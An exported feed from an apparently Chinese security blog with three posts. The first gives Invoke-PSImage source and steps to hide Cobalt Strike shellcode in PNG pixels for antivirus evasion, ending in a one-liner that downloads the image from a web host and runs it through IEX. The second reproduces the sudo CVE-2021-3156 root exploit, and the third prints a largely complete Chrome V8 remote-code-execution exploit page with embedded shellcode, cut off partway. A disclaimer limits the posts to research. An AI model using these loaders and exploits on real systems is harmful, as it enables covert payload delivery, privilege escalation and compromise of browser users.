class="line">            <span class="variable">$pscmd</span> = <span class="string">"sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"<span class="variable">$testurl</span>`");`$g=`$d.Image;`$o=a Byte[] <span class="variable">$array</span>;(0..<span class="variable">$lrows</span>)|%&#123;foreach(`$x in(0..<span class="variable">$lwidth</span>))&#123;`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*<span class="variable">$width</span>+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))&#125;&#125;;IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..<span class="variable">$lpayload</span>]))"</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$pscmd</span> = <span class="string">"sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"<span class="variable">$Out</span>`");`$o=a Byte[] <span class="variable">$array</span>;(0..<span class="variable">$lrows</span>)|%&#123;foreach(`$x in(0..<span class="variable">$lwidth</span>))&#123;`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*<span class="variable">$width</span>+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G-band15))&#125;&#125;;`$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..<span class="variable">$lpayload</span>]))"</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$pscmd</span></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment"># Decide how large our image needs to be (always square for easy math)</span></span><br><span class="line">        <span class="variable">$side</span> = ([<span class="built_in">int</span>] ([<span class="type">math</span>]::ceiling([<span class="type">math</span>]::Sqrt([<span class="type">math</span>]::ceiling(<span class="variable">$payload</span>.Length / <span class="number">3</span>)) + <span class="number">3</span>) / <span class="number">4</span>)) * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Decide how large our image needs to be (always square for easy math)</span></span><br><span class="line">        <span class="variable">$rgbValues</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$side</span> * <span class="variable">$side</span> * <span class="number">3</span>);</span><br><span class="line">        <span class="variable">$randstr</span> = [<span class="type">System.Web.Security.Membership</span>]::GeneratePassword(<span class="number">128</span>,<span class="number">0</span>)</span><br><span class="line">        <span class="variable">$randb</span> = [<span class="type">system.Text.Encoding</span>]::ASCII.GetBytes(<span class="variable">$randstr</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># loop through the RGB array and copy the payload into it</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$counter</span> = <span class="number">0</span>; <span class="variable">$counter</span> <span class="operator">-lt</span> (<span class="variable">$rgbValues</span>.Length); <span class="variable">$counter</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$counter</span> <span class="operator">-lt</span> <span class="variable">$payload</span>.Length)&#123;</span><br><span class="line">                <span class="variable">$rgbValues</span>[<span class="variable">$counter</span>] = <span class="variable">$payload</span>[<span class="variable">$counter</span>]</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$rgbValues</span>[<span class="variable">$counter</span>] = <span class="variable">$randb</span>[<span class="variable">$counter</span>%<span class="number">113</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Copy the array of RGB values back to the bitmap</span></span><br><span class="line">        <span class="variable">$ptr</span> = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="variable">$rgbValues</span>.Length)</span><br><span class="line">        [<span class="type">System.Runtime.InteropServices.Marshal</span>]::Copy(<span class="variable">$rgbValues</span>, <span class="number">0</span>, <span class="variable">$ptr</span>, <span class="variable">$rgbValues</span>.Length)</span><br><span class="line">        <span class="variable">$img</span> = <span class="built_in">New-Object</span> System.Drawing.Bitmap(<span class="variable">$side</span>, <span class="variable">$side</span>, (<span class="variable">$side</span>*<span class="number">3</span>), [<span class="type">System.Drawing.Imaging.PixelFormat</span>]::Format24bppRgb, <span class="variable">$ptr</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Write the image to a file</span></span><br><span class="line">        <span class="variable">$img</span>.Save(<span class="variable">$Out</span>, [<span class="type">System.Drawing.Imaging.ImageFormat</span>]::Png)</span><br><span class="line">        <span class="variable">$img</span>.Dispose()</span><br><span class="line">        [<span class="type">System.Runtime.InteropServices.Marshal</span>]::FreeHGlobal(<span class="variable">$ptr</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Get a bunch of numbers we need to use in the oneliner</span></span><br><span class="line">        <span class="variable">$array</span> = (<span class="variable">$side</span>*<span class="variable">$side</span>)*<span class="number">3</span></span><br><span class="line">        <span class="variable">$lrows</span> = (<span class="variable">$side</span><span class="literal">-1</span>)</span><br><span class="line">        <span class="variable">$lwidth</span> = (<span class="variable">$side</span><span class="literal">-1</span>)</span><br><span class="line">        <span class="variable">$width</span> = (<span class="variable">$side</span>)</span><br><span class="line">        <span class="variable">$lpayload</span> = (<span class="variable">$payload</span>.Length<span class="literal">-1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$WebClient</span>) &#123;</span><br><span class="line">            <span class="variable">$pscmd</span> = <span class="string">"sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"<span class="variable">$testurl</span>`"));`$o=a Byte[] <span class="variable">$array</span>;(0..<span class="variable">$lrows</span>)|%&#123;foreach(`$x in(0..<span class="variable">$lwidth</span>))&#123;`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*<span class="variable">$width</span>+`$x)*3]=`$p.B;`$o[(`$_*<span class="variable">$width</span>+`$x)*3+1]=`$p.G;`$o[(`$_*<span class="variable">$width</span>+`$x)*3+2]=`$p.R&#125;&#125;;IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..<span class="variable">$lpayload</span>]))"</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span>(<span class="variable">$PictureBox</span>) &#123;</span><br><span class="line">            <span class="variable">$pscmd</span> = <span class="string">"sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"<span class="variable">$testurl</span>`");`$g=`$d.Image;`$o=a Byte[] <span class="variable">$array</span>;(0..<span class="variable">$lrows</span>)|%&#123;foreach(`$x in(0..<span class="variable">$lwidth</span>))&#123;`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*<span class="variable">$width</span>+`$x)*3]=`$p.B;`$o[(`$_*<span class="variable">$width</span>+`$x)*3+1]=`$p.G;`$o[(`$_*<span class="variable">$width</span>+`$x)*3+2]=`$p.R&#125;&#125;;IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..<span class="variable">$lpayload</span>]))"</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$pscmd</span> = <span class="string">"sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"<span class="variable">$Out</span>`");`$o=a Byte[] <span class="variable">$array</span>;(0..<span class="variable">$lrows</span>)|%&#123;foreach(`$x in(0..<span class="variable">$lwidth</span>))&#123;`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*<span class="variable">$width</span>+`$x)*3]=`$p.B;`$o[(`$_*<span class="variable">$width</span>+`$x)*3+1]=`$p.G;`$o[(`$_*<span class="variable">$width</span>+`$x)*3+2]=`$p.R&#125;&#125;;`$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..<span class="variable">$lpayload</span>]))"</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$pscmd</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="CS生成Shellcode"><a href="#CS生成Shellcode" class="headerlink" title="CS生成Shellcode"></a>CS生成Shellcode</h5><p>Attacks &gt;&gt;  Packages &gt;&gt; Payload Generator  生成Shellcode </p>
<p><img src="/img/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/image-20210416092120420.png" alt="image-20210416092120420"></p>
<h5 id="生成Shellcode图片"><a href="#生成Shellcode图片" class="headerlink" title="生成Shellcode图片"></a>生成Shellcode图片</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1、设置策略不受限制，范围为当前用户；可get-ExecutionPolicy-List查看当前策略</span></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted <span class="literal">-Scope</span> CurrentUser</span><br><span class="line"><span class="comment"># 2、导入下载的Invoke-PSimage.ps1模块</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-PSimage</span>.ps1</span><br><span class="line"><span class="comment"># 3、生成 shellcode 的图片</span></span><br><span class="line"><span class="built_in">Invoke-PSImage</span> <span class="literal">-Script</span> .\payload.ps1 <span class="literal">-Image</span> .\<span class="number">2021</span>.jpg <span class="literal">-Out</span> .\<span class="number">2021</span>.png <span class="literal">-Web</span></span><br><span class="line"><span class="comment"># 参数介绍</span></span><br><span class="line"><span class="literal">-Script</span> [<span class="type">filepath</span>]嵌入到图像中的脚本的路径。</span><br><span class="line"><span class="literal">-Out</span> [<span class="type">filepath</span>]将结果图像保存到的文件（图像将为PNG）</span><br><span class="line"><span class="literal">-Image</span> [<span class="type">filepath</span>]要嵌入脚本的图像。</span><br><span class="line"><span class="literal">-Web</span> 输出用于使用Net.WebClient从Web读取图像的命令。</span><br></pre></td></tr></table></figure>

<p><img src="/img/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/image-20210415202230131.png" alt="image-20210415202230131"></p>
<h5 id="HTTP服务"><a href="#HTTP服务" class="headerlink" title="HTTP服务"></a>HTTP服务</h5><p>将生成的图片放在HTTP服务，这里用python3起了个HTTP服务</p>
<p><img src="/img/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/image-20210415202655248.png" alt="image-20210415202655248"></p>
<h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p>靶机机powershell运行命令，成功上线。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># http://example.com/2021.png 替换你图片地址</span></span><br><span class="line"></span><br><span class="line">sal a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">"http://example.com/2021.png"</span>));<span class="variable">$o</span>=a Byte[] <span class="number">3696</span>;(<span class="number">0</span>..<span class="number">20</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">175</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">176</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;IEX([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3598</span>]))</span><br></pre></td></tr></table></figure>

<p><img src="/img/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/image-20210415201441673.png" alt="image-20210415201441673"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://github.com/dayuxiyou/Invoke-PSImage" target="_blank" rel="noopener">https://github.com/dayuxiyou/Invoke-PSImage</a></p>
<p><a href="https://www.freebuf.com/articles/web/262978.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/262978.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>Linux sudo权限提升（CVE-2021-3156）漏洞复现</title>
    <url>/2021/06/26/Linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156%EF%BC%89/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><p>Sudo是一个功能强大的工具，其允许普通用户执行root权限命令，大多数基于Unix和Linux的操作系统都包含sudo。</p>
<p>2021年01月26日，sudo被披露存在一个基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron Samedit”），可导致本地权限提升。</p>
<p>当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。</p>
<p>安全研究人员于1月26日公开披露了此漏洞，并表示该漏洞已经隐藏了近十年。</p>
<a id="more"></a>

<h4 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Sudo <span class="number">1.8</span><span class="number">.2</span> - <span class="number">1.8</span><span class="number">.31</span>p2</span><br><span class="line">Sudo <span class="number">1.9</span><span class="number">.0</span> - <span class="number">1.9</span><span class="number">.5</span>p1</span><br></pre></td></tr></table></figure>

<h4 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h4><p>以非root用户登录系统，并运行<code>sudoedit -s /</code>命令</p>
<p>响应一个以<code>sudoedit:</code>开头的报错，那么表明存在漏洞。</p>
<p><img src="/img/Linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156%EF%BC%89/image-20210202103228116.png" alt="image-20210202103228116"></p>
<p>响应一个以<code>usage:</code>开头的报错，那么表明补丁已经生效。</p>
<p><img src="/img/Linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156%EF%BC%89/image-20210202114538438.png" alt="image-20210202114538438"></p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/blasty/CVE-2021-3156.git</span><br><span class="line"><span class="built_in">cd</span> CVE-2021-3156</span><br><span class="line">make</span><br><span class="line">./sudo-hax-me<span class="_">-a</span>-sandwich &lt;target_number&gt;</span><br></pre></td></tr></table></figure>

<h5 id="kali-Linux-测试"><a href="#kali-Linux-测试" class="headerlink" title="kali Linux 测试"></a>kali Linux 测试</h5><p><img src="/img/Linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156%EF%BC%89/image-20210202104425241.png" alt="image-20210202104425241"></p>
<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>官方已在sudo新版本1.9.5p2中修复了该漏洞，请受影响的用户尽快升级版本进行防护。</p>
<p>官方下载链接：<a href="https://www.sudo.ws/download.html" target="_blank" rel="noopener">https://www.sudo.ws/download.html</a></p>
<p><img src="/img/Linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156%EF%BC%89/image-20210202114622883.png" alt="image-20210202114622883"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.sudo.ws/alerts/unescape_overflow.html" target="_blank" rel="noopener">https://www.sudo.ws/alerts/unescape_overflow.html</a></p>
<p><a href="http://blog.nsfocus.net/cve-2021-3156/" target="_blank" rel="noopener">http://blog.nsfocus.net/cve-2021-3156/</a></p>
<p><a href="https://github.com/blasty/CVE-2021-3156" target="_blank" rel="noopener">https://github.com/blasty/CVE-2021-3156</a></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>chrome 0day 远程代码执行</title>
    <url>/2021/06/26/chrome-0day0414/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>2021年4月14日，互联网上公开了一份Chrome V8引擎远程代码执行0day漏洞POC，攻击者可通过构造特制web页面并诱导受害者访问来利用此漏洞获得远程代码执行。</p>
<p>Google Chrome是由Google开发的免费网页浏览器。许多第三方浏览器使用Chromium内核，这些浏览器同样会受该0day漏洞影响。</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Google Chrome &lt;= 90.0.4430.72</p>
<a id="more"></a>

<p>基于Chromium内核的Microsoft Edge &lt;= 89.0.774.77</p>
<p>其他基于V8引擎的第三方浏览器</p>
<h4 id="版本介绍"><a href="#版本介绍" class="headerlink" title="版本介绍"></a>版本介绍</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Google Chrome v90<span class="number">.0</span><span class="number">.4430</span><span class="number">.72</span></span><br><span class="line">Microsoft Edge v89<span class="number">.0</span><span class="number">.774</span><span class="number">.77</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/chrome-0day0414/image-20210415113316603.png" alt="image-20210415113316603"></p>
<p><img src="/img/chrome-0day0414/image-20210415113459461.png" alt="image-20210415113459461"></p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>exp.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">gc</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80000</span>; ++i) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> shellcode = [<span class="number">0xFC</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0xE8</span>, <span class="number">0xC0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x51</span>,</span></span><br><span class="line">        0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,</span><br><span class="line">        0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,</span><br><span class="line">        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,</span><br><span class="line">        0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,</span><br><span class="line">        0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,</span><br><span class="line">        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,</span><br><span class="line">        0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,</span><br><span class="line">        0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,</span><br><span class="line">        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,</span><br><span class="line">        0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,</span><br><span class="line">        0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,</span><br><span class="line">        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,</span><br><span class="line">        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,</span><br><span class="line">        0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,</span><br><span class="line">        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,</span><br><span class="line">        0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70,</span><br><span class="line">        0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00];</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> main = wasmInstance.exports.main;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bfView = <span class="keyword">new</span> <span class="built_in">DataView</span>(bf);</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">fLow</span><span class="params">(f)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        bfView.setFloat64(<span class="number">0</span>, f, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> (bfView.getUint32(<span class="number">0</span>, <span class="literal">true</span>));</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">fHi</span><span class="params">(f)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        bfView.setFloat64(<span class="number">0</span>, f, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> (bfView.getUint32(<span class="number">4</span>, <span class="literal">true</span>))</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">i2f</span><span class="params">(low, hi)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        bfView.setUint32(<span class="number">0</span>, low, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        bfView.setUint32(<span class="number">4</span>, hi, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> bfView.getFloat64(<span class="number">0</span>, <span class="literal">true</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">f2big</span><span class="params">(f)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        bfView.setFloat64(<span class="number">0</span>, f, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> bfView.getBigUint64(<span class="number">0</span>, <span class="literal">true</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">big2f</span><span class="params">(b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        bfView.setBigUint64(<span class="number">0</span>, b, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> bfView.getFloat64(<span class="number">0</span>, <span class="literal">true</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">constructor</span>(size) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">super</span>(size);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.slot = <span class="number">0xb33f</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">(a)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> x = <span class="number">-1</span>;</span></span><br><span class="line">        if (a) x = 0xFFFFFFFF;</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>, x, <span class="number">-1</span>)));</span></span><br><span class="line">        arr.shift();</span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> local_arr = <span class="built_in">Array</span>(<span class="number">2</span>);</span></span><br><span class="line"><span class="actionscript">        local_arr[<span class="number">0</span>] = <span class="number">5.1</span>;<span class="comment">//4014666666666666</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> buff = <span class="keyword">new</span> LeakArrayBuffer(<span class="number">0x1000</span>);<span class="comment">//byteLength idx=8</span></span></span><br><span class="line">        arr[0] = 0x1122;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> [arr, local_arr, buff];</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = 